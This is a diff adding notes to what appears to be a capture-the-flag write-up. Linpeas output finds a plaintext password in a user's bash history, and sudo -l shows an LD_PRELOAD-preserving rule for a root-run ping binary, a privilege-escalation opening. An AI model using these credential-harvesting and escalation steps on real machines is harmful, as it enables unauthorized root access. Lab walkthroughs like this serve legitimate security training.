@@ -80,6 +80,29 @@ Session completed.
 Enter passphrase for key 'rsa_id7': 
 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
 
+### run linpease and found
+╔══════════╣ Searching passwords in history files
+/home/saad/.bash_history:sudo -l                                                                                    
+/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+/home/saad/.bash_history:sudo -l
+/home/saad/.bash_history:sudo -l
+/home/saad/.bash_history:mysql -u root -p
+/home/saad/.bash_history:mysql -u root
+/home/saad/.bash_history:sudo su
+/home/saad/.bash_history:ssh root@192.169.155.104
+/home/saad/.bash_history:mysql -u user -p
+/home/saad/.bash_history:mysql -u db_user -p
+/home/saad/.bash_history:ls -ld /var/lib/mysql
+
+## saad:MyStrongestPasswordYet$4291
+
+saad@m4lware:/tmp$ sudo -l
+Matching Defaults entries for saad on m4lware:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on m4lware:
+    (root) /usr/bin/ping
 
 
 <\code>
